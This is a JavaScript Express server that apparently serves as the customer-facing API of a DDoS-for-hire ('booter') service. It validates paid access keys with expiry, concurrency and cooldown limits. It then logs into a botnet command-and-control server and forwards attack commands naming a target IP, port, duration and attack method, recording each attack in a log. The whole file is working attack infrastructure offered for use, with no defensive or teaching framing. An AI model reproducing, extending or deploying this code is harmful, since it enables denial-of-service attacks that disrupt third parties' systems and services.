const express = require('express');
const fs = require('fs');
const app = express();
const moment = require("moment");
const net = require("net");
//let cooldownActive = false;
const configData = fs.readFileSync('config.json');
const config = JSON.parse(configData);
let deviceCount = 0;
function validateIPaddress(ipaddress) {
  const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
  return regex.test(ipaddress);
}
app.get('/', (req, res, next) => {
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;
  const method = req.query.method;
  const len = req.query.len;
  const key = req.query.key;
  const attack_method = require('./methods.json');
  const keys = fs.readFileSync('keys.json');
  const keyData = JSON.parse(keys);


  if (typeof host === 'undefined' || typeof port === 'undefined' || typeof time === 'undefined' || typeof method === 'undefined' || typeof key === 'undefined') {
    res.status(400).json({ error: true, message: "missing required parameters" });
  } else {
    if (!validateIPaddress(host)) {
      return res.status(400).json({ error: true, message: "invalid ip address" });
    }
    if (!method) return res.status(400).json({"error": true, message: "method is not defined."});
    if (!attack_method[method]) return  res.status(400).json({"error": true, "message": "invalid method."});
    if (!host) return res.status(400).json({"error": true, message: "host is not defined."})
    if (!port) return res.status(400).json({"error": true, message: "port is not defined."})
    if (!time) return res.status(400).json({"error": true, message: "time is not defined."})
    if (!key) return res.status(400).json({"error": true, message: "key is not defined."})
    if (!keyData[key]) return res.status(403).json(({"error": true, message: "unauthorized."}));
    if (time > keyData[key]["time"]) return res.status(400).json({"error": true, message: "maximum time reached."});
    if (keyData[key].curCons >= keyData[key].maxCons) return res.status(400).json({"error": true, message: "maximum concurrents reached."});
    if (isNaN(time)) return res.status(400).json({"error": true, message: "time is not an integer."});
    if (isNaN(port)) return res.status(400).json({"error": true, message: "port is not an integer."});
    if (keyData[key].cooldownActive == true) return res.status(429).json({"error": true, message: `${keyData[key].cooldownDuration} second cooldown is currently active.`});

    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    const currentDay = new Date().getDate();
    const together = [currentYear, currentMonth, currentDay];
    if ("expiry" in keyData[key]) {
        const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
        if (expiry.isSameOrBefore(moment())) return res.status(401).json({error: true, message: "Key has expired."});
    }
    const socket = new net.Socket();

    socket.connect(config.cnc_port, config.cnc_host, () => {
      setTimeout(() => {
        socket.write(config.cnc_username + "\r\n");
      }, 50);
      setTimeout(() => {
        socket.write(config.cnc_password + "\r\n");
      }, 200);
      if (typeof len !== 'undefined') {
        setTimeout(() => {

          socket.write(attack_method[method].method + " " + host + " " + time + " " + "dport="+ port + " " + "len=" + len +"\r\n");
          socket.end();
        }, 300);
      } else {
        setTimeout(() => {

          socket.write(attack_method[method].method + " " + host + " " + time + " " + "dport="+ port +"\r\n");
          socket.end();

        }, 300);
      }
    });

    socket.on("data", (buffer) => {
      process.stdout.write(buffer.toString("utf8"));
    });

    socket.on("error", (err) => {
      console.error(err);
      res.status(500).json({ error: true, message: "cnc connection error" });
    });

    socket.on("close", () => {
      keyData[key].curCons += 1;
      fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
        if (err) {
          console.error(err);
          res.status(500).json({ error: true, message: "Error writing to keys.json" });
        } else {
          res.status(200).json({ error: false, message: "attack has been parsed successfully." });
          const timestamp = new Date().toISOString();
          const data = `Key=${key} Target=${host} Attack_Duration=${time} Port=${port} Method=${method}` + '\r\n';
          const logEntry = `[${timestamp}] ${data}`;

          fs.writeFile('attack.log', logEntry, { flag: 'a' }, (err) => {
            if (err) {
              console.error(err);
              return;
            }
          });

          setTimeout(() => {
            socket.end();
          }, 110);

setTimeout(() => {
    keyData[key].curCons -= 1;
    keyData[key].cooldownActive = true;
    fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
        if (err) {
            console.error(err);
        }
    });


    setTimeout(() => {
        keyData[key].cooldownActive = false;
        fs.writeFile("keys.json", JSON.stringify(keyData, null, 4), (err) => {
            if (err) {
                console.error(err);
            }
        });
    }, parseInt(keyData[key].cooldownDuration) * 1000);
}, parseInt(time) * 1000);
        }
      });
    });
  }
});

app.use((err, req, res, next) => {
  console.error(err.stack);
  if (!res.headersSent) {
    res.status(500).json({ error: "true", message: "internal server Error" });
  }
});

app.listen(config.web_port, () => {
  console.log(`Server running on port: ${config.web_port}/`);
});
